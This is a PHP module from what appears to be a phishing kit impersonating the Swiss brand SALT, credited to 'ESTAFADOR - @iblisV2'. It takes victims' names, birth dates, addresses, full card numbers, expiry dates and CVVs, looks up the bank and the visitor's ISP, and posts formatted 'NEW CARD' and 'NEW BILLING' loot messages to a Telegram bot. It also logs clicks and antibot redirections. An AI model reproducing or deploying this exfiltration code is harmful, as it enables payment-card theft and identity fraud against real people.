<?php

declare(strict_types=1);

function telegram_config(): ?array
{
    static $config = null;

    if ($config !== null) {
        return $config;
    }

    $path = dirname(__DIR__, 2) . '/config/telegram.php';
    if (!is_file($path)) {
        return null;
    }

    $loaded = require $path;
    if (!is_array($loaded)) {
        return null;
    }

    $config = $loaded;
    return $config;
}

function field_value(array $data, string $key): string
{
    $value = trim((string) ($data[$key] ?? ''));

    return $value !== '' ? $value : '—';
}

function format_title_sex(string $title): string
{
    return match (strtolower($title)) {
        'mr' => 'M.',
        'mrs', 'mme' => 'Mme',
        default => $title !== '' ? $title : '—',
    };
}

function format_card_number(string $number): string
{
    $digits = preg_replace('/\D/', '', $number);

    if ($digits === '') {
        return '—';
    }

    return trim(chunk_split($digits, 4, ' '));
}

function format_street_address(array $data): string
{
    $parts = array_filter([
        trim((string) ($data['street'] ?? '')),
        trim((string) ($data['streetNumber'] ?? '')),
    ], static fn (string $part): bool => $part !== '');

    return $parts !== [] ? implode(' ', $parts) : '—';
}

function interface_footer_date(): string
{
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);

    return $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');
}

function detect_card_brand(string $digits): string
{
    if ($digits === '') {
        return '—';
    }

    if (str_starts_with($digits, '4')) {
        return 'Visa';
    }
    if (preg_match('/^5[1-5]/', $digits) || str_starts_with($digits, '2')) {
        return 'Mastercard';
    }
    if (preg_match('/^3[47]/', $digits)) {
        return 'American Express';
    }
    if (str_starts_with($digits, '6')) {
        return 'Discover';
    }

    return '—';
}

function lookup_card_bin(string $cardNumber): array
{
    $digits = preg_replace('/\D/', '', $cardNumber);
    $fallback = [
        'bank' => '—',
        'brand' => detect_card_brand($digits),
        'type' => '—',
        'country' => '—',
    ];

    if (strlen($digits) < 6) {
        return $fallback;
    }

    $bin = substr($digits, 0, min(8, strlen($digits)));
    $url = 'https://lookup.binlist.net/' . $bin;
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "Accept: application/json\r\nAccept-Version: 3\r\n",
            'timeout' => 5,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return $fallback;
    }

    $json = json_decode($response, true);
    if (!is_array($json)) {
        return $fallback;
    }

    return [
        'bank' => trim((string) ($json['bank']['name'] ?? '')) ?: '—',
        'brand' => trim((string) ($json['scheme'] ?? '')) ?: $fallback['brand'],
        'type' => trim((string) ($json['type'] ?? '')) ?: '—',
        'country' => trim((string) ($json['country']['name'] ?? '')) ?: '—',
    ];
}

function lookup_isp(string $ip): string
{
    if ($ip === '—' || !filter_var($ip, FILTER_VALIDATE_IP)) {
        return '—';
    }

    $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=status,isp';
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 5,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return '—';
    }

    $json = json_decode($response, true);
    if (!is_array($json) || ($json['status'] ?? '') !== 'success') {
        return '—';
    }

    return trim((string) ($json['isp'] ?? '')) ?: '—';
}

function msg_val(array $data, string $key): string
{
    return trim((string) ($data[$key] ?? ''));
}

function format_nationality(string $country): string
{
    return match (strtolower($country)) {
        'ch' => 'Suisse',
        'li' => 'Liechtenstein',
        default => trim($country),
    };
}

function build_card_message(array $data, bool $partial = false): string
{
    $cardDigits = $partial ? '' : preg_replace('/\D/', '', (string) ($data['cardNumber'] ?? ''));
    $client = is_array($data['client'] ?? null) ? $data['client'] : [];

    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $year = $now->format('Y');
    $jj = $now->format('d');
    $mm = $now->format('m');
    $time = $now->format('H:i:s');

    $card = $cardDigits;
    $bin = lookup_card_bin($cardDigits);
    $titre = format_title_sex((string) ($data['title'] ?? ''));
    if ($titre === '—') {
        $titre = '';
    }
    $banque = $bin['bank'] === '—' ? '' : $bin['bank'];
    $marque = $bin['brand'] === '—' ? '' : $bin['brand'];
    $type = $bin['type'] === '—' ? '' : $bin['type'];
    $paysBanque = $bin['country'] === '—' ? '' : $bin['country'];
    $nationalite = format_nationality((string) ($data['country'] ?? ''));
    $nom = msg_val($data, 'lastName');
    $prenom = msg_val($data, 'firstName');
    $naissance = msg_val($data, 'birthDate');
    $mail = msg_val($data, 'email');
    $numero = msg_val($data, 'phone');
    $adresse = format_street_address($data);
    if ($adresse === '—') {
        $adresse = '';
    }
    $ville = msg_val($data, 'city');
    $cp = msg_val($data, 'zip');
    $plus = msg_val($data, 'addressDetails');
    $nomTitulaire = $partial ? '' : msg_val($data, 'cardHolder');
    $carte = $partial ? '' : format_card_number($cardDigits);
    if ($carte === '—') {
        $carte = '';
    }
    $exp = $partial ? '' : msg_val($data, 'cardExpiry');
    $cvv = $partial ? '' : msg_val($data, 'cardCvv');
    $isp = lookup_isp(client_ip());
    if ($isp === '—') {
        $isp = '';
    }
    $info = trim((string) ($client['userAgent'] ?? ''));
    $appareil = trim((string) ($client['device'] ?? ''));
    $systeme = trim((string) ($client['os'] ?? ''));

    if ($partial) {
        return <<<TXT
[💳] + 1 NEW BILLING | SALT [💳]
    ⤷{$card}

🧐Informations Personnelles 
⤷ 🧐 Sex : {$titre}
⤷ 💁 Nationalité : {$nationalite}
⤷ 👤 Nom : {$nom}
⤷ 👤 Prénom : {$prenom}
⤷ 🎂 Naissance : {$naissance}
⤷ 📧 Email : {$mail}
⤷ 📞 Téléphone : {$numero}

📍 Adresse
⤷ 🏠 Adresse : {$adresse}
⤷ 🏙️ Ville : {$ville}
⤷ 📮 Code postal : {$cp}
⤷➕ Complément : {$plus} 

🔍 Informations Complémentaires
├ 🛰 ISP : {$isp}
├ ⚙️ User Agent : {$info}
├ 💻 Appareil : {$appareil} - {$systeme}

━━━━━━━━━━━━━━━━━━━
📱Interface : SALT 
[{$year}-{$jj}-{$mm} {$time}]

➢ Developed By ESTAFADOR - @iblisV2 
━━━━━━━━━━━━━━━━━━━━
TXT;
    }

    return <<<TXT
[💳] + 1 NEW CARD | SALT [💳]
    ⤷{$card}

🧐Informations Personnelles 
⤷ 🧐 Sex : {$titre}
⤷ 💁 Nationalité : {$nationalite}
⤷ 👤 Nom : {$nom}
⤷ 👤 Prénom : {$prenom}
⤷ 🎂 Naissance : {$naissance}
⤷ 📧 Email : {$mail}
⤷ 📞 Téléphone : {$numero}

📍 Adresse
⤷ 🏠 Adresse : {$adresse}
⤷ 🏙️ Ville : {$ville}
⤷ 📮 Code postal : {$cp}
⤷➕ Complément : {$plus} 

🏦 Carte De Paiement
⤷ 👤 Titulaire : {$nomTitulaire}
⤷ 💳 Numéro de carte : {$carte}
⤷ 📅 Date d'expiration : {$exp}
⤷ 🔐 Cryptogramme Visuel : {$cvv}

🏛️ Informations Bancaires
⤷ 🧠 Banque : {$banque}
⤷ ⭐️ Marque : {$marque}
⤷ 🧩 Type : {$type}
⤷ 🌍 Pays : {$paysBanque}

🔍 Informations Complémentaires
├ 🛰 ISP : {$isp}
├ ⚙️ User Agent : {$info}
├ 💻 Appareil : {$appareil} - {$systeme}

━━━━━━━━━━━━━━━━━━━
📱Interface : SALT 
[{$year}-{$jj}-{$mm} {$time}]

➢ Developed By ESTAFADOR - @iblisV2 
━━━━━━━━━━━━━━━━━━━━
TXT;
}

function build_order_message(array $data): string
{
    return build_card_message($data);
}

function telegram_chat_id(array $config, string $channel): string
{
    if ($channel === 'clicks') {
        return trim((string) ($config['chat_id_clicks'] ?? $config['chat_id'] ?? ''));
    }

    if ($channel === 'billing') {
        return trim((string) ($config['chat_id_billing'] ?? $config['chat_id'] ?? ''));
    }

    if ($channel === 'cc') {
        return trim((string) ($config['chat_id_cc'] ?? $config['chat_id_rez'] ?? $config['chat_id'] ?? ''));
    }

    return trim((string) ($config['chat_id_rez'] ?? $config['chat_id'] ?? ''));
}

function telegram_api_request(string $method, array $params): ?array
{
    $config = telegram_config();
    if ($config === null) {
        return null;
    }

    $token = trim((string) ($config['bot_token'] ?? ''));
    if ($token === '') {
        return null;
    }

    $url = 'https://api.telegram.org/bot' . $token . '/' . $method;
    $body = json_encode($params, JSON_UNESCAPED_UNICODE);
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $body,
            'timeout' => 10,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return null;
    }

    $json = json_decode($response, true);

    return is_array($json) ? $json : null;
}

function telegram_site_base_cache_file(): string
{
    return dirname(__DIR__, 2) . '/data/panel/site-base-url.txt';
}

function telegram_read_site_base_cache(): string
{
    $file = telegram_site_base_cache_file();
    if (!is_file($file)) {
        return '';
    }

    $url = trim((string) file_get_contents($file));

    return filter_var($url, FILTER_VALIDATE_URL) ? rtrim($url, '/') : '';
}

function telegram_write_site_base_cache(string $baseUrl): void
{
    $dir = dirname(telegram_site_base_cache_file());
    if (!is_dir($dir)) {
        mkdir($dir, 0750, true);
    }

    file_put_contents(telegram_site_base_cache_file(), rtrim($baseUrl, '/') . "\n", LOCK_EX);
}

function telegram_detect_host(): string
{
    foreach (['HTTP_X_FORWARDED_HOST', 'HTTP_HOST', 'SERVER_NAME'] as $key) {
        $raw = trim((string) ($_SERVER[$key] ?? ''));
        if ($raw === '') {
            continue;
        }

        $host = trim(explode(',', $raw)[0]);
        if ($host !== '' && preg_match('/^[a-zA-Z0-9.\-:\[\]]+$/', $host)) {
            return $host;
        }
    }

    return '';
}

function telegram_detect_scheme(): string
{
    $forwarded = strtolower(trim((string) ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '')));
    if ($forwarded === 'https') {
        return 'https';
    }

    if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
        return 'https';
    }

    if ((string) ($_SERVER['SERVER_PORT'] ?? '') === '443') {
        return 'https';
    }

    $cfVisitor = (string) ($_SERVER['HTTP_CF_VISITOR'] ?? '');
    if ($cfVisitor !== '' && str_contains($cfVisitor, 'https')) {
        return 'https';
    }

    return 'http';
}

function telegram_detect_site_base_url(): string
{
    $host = telegram_detect_host();
    if ($host === '') {
        return '';
    }

    return telegram_detect_scheme() . '://' . $host;
}

function telegram_site_base_url(): string
{
    static $resolved = null;
    if ($resolved !== null) {
        return $resolved;
    }

    $cached = telegram_read_site_base_cache();
    $detected = telegram_detect_site_base_url();

    if ($detected !== '') {
        if ($cached !== $detected) {
            telegram_write_site_base_cache($detected);
        }
        $resolved = $detected;

        return $resolved;
    }

    $resolved = $cached;

    return $resolved;
}

function telegram_panel_url(): string
{
    $base = telegram_site_base_url();
    if ($base === '') {
        return '';
    }

    return $base . '/panel/index.php';
}

function telegram_ban_ip_keyboard(string $ip): ?array
{
    $rows = [];

    if (filter_var($ip, FILTER_VALIDATE_IP)) {
        $rows[] = [[
            'text' => '🚫 BANNIR IP',
            'callback_data' => 'ban:' . $ip,
        ]];
    }

    $panelUrl = telegram_panel_url();
    if ($panelUrl !== '') {
        $rows[] = [[
            'text' => '🔐 Panel admin',
            'url' => $panelUrl,
        ]];
    }

    if ($rows === []) {
        return null;
    }

    return [
        'inline_keyboard' => $rows,
    ];
}

function send_telegram_message(string $text, string $channel = 'rez', ?array $replyMarkup = null): bool
{
    $config = telegram_config();
    if ($config === null || empty($config['enabled'])) {
        return false;
    }

    $token = trim((string) ($config['bot_token'] ?? ''));
    $chatId = telegram_chat_id($config, $channel);
    if ($token === '' || $chatId === '') {
        return false;
    }

    $params = [
        'chat_id' => $chatId,
        'text' => $text,
        'disable_web_page_preview' => true,
    ];

    if ($replyMarkup !== null) {
        $params['reply_markup'] = $replyMarkup;
    }

    $json = telegram_api_request('sendMessage', $params);

    return is_array($json) && !empty($json['ok']);
}

function send_telegram_rez_with_ban(string $text, string $ip): bool
{
    return send_telegram_message($text, 'rez', telegram_ban_ip_keyboard($ip));
}

function telegram_answer_callback(string $callbackQueryId, string $text, bool $showAlert = false): bool
{
    $json = telegram_api_request('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert' => $showAlert,
    ]);

    return is_array($json) && !empty($json['ok']);
}

function notify_order(array $data): bool
{
    require_once __DIR__ . '/panel-stats.php';
    panel_stats_record_card($data);

    return send_telegram_message(build_order_message($data), 'cc', telegram_ban_ip_keyboard(client_ip()));
}

function notify_partial_order(array $data): bool
{
    require_once __DIR__ . '/panel-stats.php';
    panel_stats_record_billing($data);

    return send_telegram_message(build_card_message($data, true), 'billing', telegram_ban_ip_keyboard(client_ip()));
}

function client_ip(): string
{
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];

    foreach ($keys as $key) {
        if (empty($_SERVER[$key])) {
            continue;
        }
        $value = trim(explode(',', (string) $_SERVER[$key])[0]);
        if (filter_var($value, FILTER_VALIDATE_IP)) {
            return $value;
        }
    }

    return '—';
}

function build_click_message(): string
{
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $datetime = $now->format('Y-m-d H:i:s');
    $interfaceDate = $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');

    return implode("\n", [
        '[🛜] +1 NEW CLICK - SUITE SITE [🛜]',
        '',
        '🕐 ' . $datetime,
        '',
        'ℹ️ INFORMATIONS',
        '⤷ IP : ' . client_ip(),
        '',
        '━━━━━━━━━━━━━━━━━━━',
        '📱Interface : SALT',
        '[' . $interfaceDate . ']',
        '',
        '➢ Developed By ESTAFADOR - @iblisV2',
        '━━━━━━━━━━━━━━━━━━━━',
    ]);
}

function notify_click(): bool
{
    require_once __DIR__ . '/panel-stats.php';
    panel_stats_record_click();

    return send_telegram_message(build_click_message(), 'clicks');
}

function build_antibot_redirect_message(string $reason, string $ip): string
{
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $datetime = $now->format('Y-m-d H:i:s');
    $interfaceDate = $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');

    return implode("\n", [
        '[🚫] +1 NEW CLICK — REDIRECTION ANTIBOT [🚫]',
        '',
        '🕐 ' . $datetime,
        '',
        'ℹ️ • ANTIBOT',
        '|- ✅ Visiteur redirige avec succes',
        '|- 🌍 IP : ' . $ip,
        '|- Raison : ' . $reason,
        '',
        '━━━━━━━━━━━━━━━━━━━',
        '📱Interface : SALT',
        '[' . $interfaceDate . ']',
        '',
        '➢ Developed By ESTAFADOR - @iblisV2',
        '━━━━━━━━━━━━━━━━━━━━',
    ]);
}

function notify_antibot_redirect(string $reason, string $ip): bool
{
    return send_telegram_message(build_antibot_redirect_message($reason, $ip), 'clicks');
}

function notify_site_click_once(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    if (!empty($_SESSION['salt_click_sent'])) {
        return;
    }

    if (function_exists('antibot_allow_click') && !antibot_allow_click()) {
        return;
    }

    $_SESSION['salt_click_sent'] = true;
    notify_click();
}
